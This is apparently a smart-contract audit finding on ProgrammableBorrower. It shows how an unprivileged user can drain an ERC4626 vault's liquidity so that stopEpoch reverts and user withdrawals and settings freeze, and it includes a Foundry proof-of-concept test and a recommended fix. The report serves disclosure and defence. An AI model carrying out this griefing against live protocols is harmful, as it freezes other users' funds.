### Title
External ERC4626 liquidity griefing can keep an epoch running and block configuration changes - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
In programmable-borrower mode, `stopEpoch` can be repeatedly blocked by an unprivileged participant in the configured ERC4626 vault who removes the vault’s available liquidity without reducing its accounting assets. `ProgrammableBorrower.onStopEpoch` treats a covered withdrawal failure as a hard revert, so `IdleCDOEpochVariant.isEpochRunning` remains `true`, preventing epoch settlement and blocking configuration functions such as `setEpochParams` and `setIsProgrammableBorrower`. [1](#0-0) [2](#0-1) 

### Finding Description
At epoch start, the programmable borrower deposits its idle underlying balance into the configured ERC4626 vault and activates `epochAccountingActive`. [3](#0-2) 

While the epoch is running, the CDO pauses normal deposits and disables new withdrawal requests. [4](#0-3) 

After `epochEndDate`, the owner or manager calls `stopEpoch`; before attempting the borrower `transferFrom`, the CDO invokes `IProgrammableBorrower.onStopEpoch` with the cash amount required for pending withdrawals and any non-minted interest. [5](#0-4) [1](#0-0) 

If the borrower contract lacks sufficient on-hand cash, `onStopEpoch` first checks that the shortfall is economically covered by `_currentVaultAssets()`; if it is covered, it calls `vault.withdraw`. [6](#0-5) 

A public participant in the ERC4626 vault can make that withdrawal fail by consuming the vault’s currently available liquidity—for example, by borrowing or withdrawing the idle assets from the underlying market—while the vault still reports enough total assets to cover the facility’s shares. [2](#0-1) 

The withdrawal failure is converted into `StopEpochVaultLiquidityUnavailable` and propagates through `stopEpoch`, because the CDO only catches failures from `getFundsFromBorrower`, not failures from the preceding borrower hook. [7](#0-6) [8](#0-7) 

Consequently, the success path that clears `isEpochRunning` is never reached, while `ProgrammableBorrower.epochAccountingActive` also remains `true`. [9](#0-8) 

This blocks both CDO-level and borrower-level configuration: `setEpochParams` and `setIsProgrammableBorrower` revert while `isEpochRunning`, while `setVault` and `setBorrower` revert while `epochAccountingActive` or outstanding borrower exposure remains. [10](#0-9) [11](#0-10) [12](#0-11) [13](#0-12) 

The operator cannot reliably escape through `emergencyExitVault`, because it uses the same external ERC4626 liquidity and will revert while redemption is unavailable. [14](#0-13) 

### Impact Explanation
The attacker temporarily freezes epoch settlement and therefore prevents pending withdrawals, LP exits, and the next buffer period from being reached; the amount at risk is up to the entire programmable-facility NAV held in the external vault, plus any borrower cash required for pending withdrawals. [4](#0-3) [15](#0-14) 

The same condition freezes operational settings for as long as the external vault remains illiquid, and the attacker can repeat the liquidity consumption whenever enough liquidity returns. [12](#0-11) [13](#0-12) 

This is a temporary-freezing issue rather than direct theft: once the vault can satisfy the withdrawal, `stopEpoch` can be retried successfully. [16](#0-15) 

### Likelihood Explanation
The issue requires programmable-borrower mode, an active epoch, an ERC4626-funded shortfall, and a public vault whose available withdrawal liquidity can be consumed by unprivileged users. [17](#0-16) [2](#0-1) 

Those conditions are realistic for public credit or lending vaults because available cash can change between the coverage check and execution; an attacker with sufficient collateral or vault shares can deliberately create the shortage near the expected stop call. [2](#0-1) 

The duration is bounded by the attacker’s ability to keep the venue illiquid, so this is more likely a medium-impact availability issue than a permanent loss. [14](#0-13) 

### Recommendation
Do not let an external covered-but-illiquid ERC4626 withdrawal propagate as an unhandled `stopEpoch` revert. [7](#0-6) 

Prefer checking `vault.maxWithdraw(address(this))` or equivalent liquidity before calling `withdraw`, and either return `false` into the existing default path or enter an explicit `liquidityHalted` state that preserves the stranded vault-share accounting. [2](#0-1) [1](#0-0) 

If a halted state is used, provide an owner override that can settle or close the epoch and account for the vault position explicitly, rather than simply clearing `epochAccountingActive` while shares remain stranded. [12](#0-11) 

### Proof of Concept
The following fork test models a public credit-style ERC4626 vault whose reported `totalAssets` remain backed after a market participant removes all available cash, which is the condition that makes `onStopEpoch` revert despite sufficient vault shares.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower, StopEpochVaultLiquidityUnavailable, NotAllowed}
    from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PublicCreditVault {
    IERC20Detailed public immutable asset;
    uint256 public totalSupply;
    uint256 public lent;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20Detailed _asset) {
        asset = _asset;
    }

    function totalAssets() public view returns (uint256) {
        // Outstanding loans still count as assets even though they cannot be withdrawn now.
        return asset.balanceOf(address(this)) + lent;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return totalSupply == 0 ? shares : shares * totalAssets() / totalSupply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = totalSupply == 0
            ? assets
            : assets * totalSupply / totalAssets();
        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        // Available cash, not totalAssets, determines whether withdrawal succeeds.
        require(asset.balanceOf(address(this)) >= assets, "NO_LIQUIDITY");
        shares = assets * totalSupply / totalAssets();
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        require(asset.balanceOf(address(this)) >= assets, "NO_LIQUIDITY");
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assets);
    }

    function maxWithdraw(address owner) external view returns (uint256) {
        uint256 owned = convertToAssets(balanceOf[owner]);
        uint256 cash = asset.balanceOf(address(this));
        return owned < cash ? owned : cash;
    }

    // Models permissionless borrowing of the vault's lendable cash.
    function borrowCash(uint256 assets) external {
        lent += assets;
        asset.transfer(msg.sender, assets);
    }

    function repayCash(uint256 assets) external {
        lent -= assets;
        asset.transferFrom(msg.sender, address(this), assets);
    }
}

contract StopEpochLiquidityGriefPoC is Test {
    IERC20Detailed constant USDC =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    ProgrammableBorrower internal borrowerAdapter;
    PublicCreditVault internal vault;
    PublicCreditVault internal replacementVault;

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal realBorrower = makeAddr("realBorrower");
    address internal attacker = makeAddr("attacker");

    // ProgrammableBorrower reads this through IIdleCDOToken during initialize.
    function token() external pure returns (address) {
        return address(USDC);
    }

    function test_coveredButIlliquidVaultBlocksStopAndSettings() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        vault = new PublicCreditVault(USDC);
        replacementVault = new PublicCreditVault(USDC);
        borrowerAdapter = new ProgrammableBorrower();

        // This test contract acts as the configured idleCDO caller.
        borrowerAdapter.initialize(
            address(vault),
            address(this),
            owner,
            manager,
            realBorrower,
            0
        );

        uint256 facilityAssets = 1_000_000e6;
        uint256 requiredAtStop = 200_000e6;

        deal(address(USDC), address(borrowerAdapter), facilityAssets);

        // Epoch starts: idle cash is deposited into the public vault.
        borrowerAdapter.onStartEpoch(requiredAtStop);
        assertEq(USDC.balanceOf(address(vault)), facilityAssets);

        // An unprivileged vault/market user borrows enough cash to leave less
        // than requiredAtStop, while lent keeps totalAssets fully backed.
        vm.prank(attacker);
        vault.borrowCash(facilityAssets - requiredAtStop + 1);

        assertGt(vault.convertToAssets(vault.balanceOf(address(borrowerAdapter))), requiredAtStop);
        assertLt(vault.maxWithdraw(address(borrowerAdapter)), requiredAtStop);

        // The same revert propagates out of IdleCDOEpochVariant.stopEpoch.
        vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
        borrowerAdapter.onStopEpoch(requiredAtStop, false);

        // Epoch accounting remains live.
        assertTrue(borrowerAdapter.epochAccountingActive());

        // Operator settings remain unavailable while the position is live.
        vm.expectRevert(NotAllowed.selector);
        vm.prank(owner);
        borrowerAdapter.setVault(address(replacementVault));

        vm.expectRevert(NotAllowed.selector);
        vm.prank(owner);
        borrowerAdapter.setBorrower(makeAddr("newBorrower"));

        // Once liquidity returns, the same stop succeeds, showing temporary freeze.
        vm.startPrank(attacker);
        USDC.approve(address(vault), type(uint256).max);
        vault.repayCash(facilityAssets - requiredAtStop + 1);
        vm.stopPrank();

        assertTrue(borrowerAdapter.onStopEpoch(requiredAtStop, false));
        assertFalse(borrowerAdapter.epochAccountingActive());
    }
}
```

```text
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;

    _depositToVault(underlyingToken.balanceOf(address(this)), 0);

    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```
